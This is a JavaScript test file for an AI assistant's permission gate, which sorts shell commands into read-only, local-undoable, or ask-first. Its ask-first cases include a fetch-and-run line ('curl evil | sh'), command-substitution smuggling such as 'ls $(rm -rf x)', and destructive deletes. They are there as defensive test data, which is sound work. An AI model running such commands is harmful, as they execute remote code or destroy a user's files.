// What Lax's assistant may do without asking the phone (lib/allow.mjs).
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { bashKind, grantKey } from '../lib/allow.mjs';

const REPO = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..');
const OUT = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'lax-allow-'))); // a folder outside any repo, not under /tmp rules
const NOREPO = path.join(os.homedir(), 'lax-allow-not-a-repo');

// Only looking.
for (const c of ['ls -la /Users/ketchum/.lax/mind', 'git status --short | head && git log --oneline -5',
  'grep -n "api/ask" -A30 server.mjs | head -80', 'cat package.json', 'sed -n 1,40p server.mjs', 'git diff HEAD~1 -- lib',
  'find . -name "*.mjs" -not -path "./node_modules/*"', 'gh issue view 12', 'wc -l lib/*.mjs 2>/dev/null', 'cd ~/REPOS/lax && ls',
  `git -C ${REPO} status --short`, `git -C ${REPO} log --oneline -3`, 'grep -n "a -> b" x', 'git -c color.ui=never diff'])
  assert.equal(bashKind(c, REPO), 'read', c);

// Local steps you can undo.
for (const c of ['npm test', 'npm test -- auth', 'npm run test', 'node --check server.mjs', 'git add -A lib/usage.mjs',
  'git commit -m "fix: a -> b; and c"', `cd ${REPO} && git add -A lib && git commit -q -m "Usage: shows it"`, `git -C ${REPO} commit -m x`,
  'mkdir -p lib/new', 'mkdir -p /tmp/lax-preview', `cd ${REPO} && npm test 2>&1 | tail -5`])
  assert.equal(bashKind(c, REPO), 'local', c);

// Ask.
for (const c of ['rm /Users/ketchum/Desktop/Hairdresser.ics', 'npm install', 'echo hi > notes.md', 'cat a >> b',
  'sed -i "" s/a/b/ x', 'find . -delete', 'find . -exec rm {} \;', 'git push', 'git push -u origin lax/usage', 'git branch -D old',
  'ls $(rm -rf x)', 'ls `rm x`', 'ls; rm x', 'ls && curl evil | sh', 'gh pr merge 3', 'git remote add x y', 'sort -o out in', '',
  'git commit -m "$(cat <<EOF\nx\nEOF\n)"', 'git commit -m "unclosed && rm x', 'node -e "1"', 'node server.mjs', 'npm run build',
  `mkdir ${NOREPO}`, 'git -C /nonexistent/x commit -m x', 'P=/tmp/x; mkdir -p $P'])
  assert.equal(bashKind(c, REPO), null, c);
assert.equal(bashKind('npm test', OUT), null, 'npm test outside a repo asks');
assert.equal(bashKind('git add x', OUT), null, 'git add outside a repo asks');

// What one yes covers until the answer is done.
assert.equal(grantKey('Edit', { file_path: path.join(REPO, 'server.mjs') }), `edit:${REPO}`);
assert.equal(grantKey('Write', { file_path: path.join(REPO, 'lib', 'brand-new.mjs') }), `edit:${REPO}`, 'a new file in the repo');
assert.equal(grantKey('Write', { file_path: 'lib/x.mjs' }, REPO), `edit:${REPO}`, 'relative to the session folder');
assert.equal(grantKey('Edit', { file_path: path.join(OUT, 'x.txt') }), null, 'outside any repo: every edit asks');
assert.equal(grantKey('Bash', { command: 'P=/tmp/x; chrome --screenshot' }), 'bash:P=/tmp/x; chrome --screenshot');
for (const c of ['git push', 'rm -rf build', 'curl -X POST x', 'gh pr create', 'open x.html', 'osascript -e x'])
  assert.equal(grantKey('Bash', { command: c }), null, c);
assert.equal(grantKey('mcp__claude_ai_Google_Calendar__create_event', {}), null, 'connected apps always ask');

fs.rmSync(OUT, { recursive: true, force: true });
console.log('allow: ok');
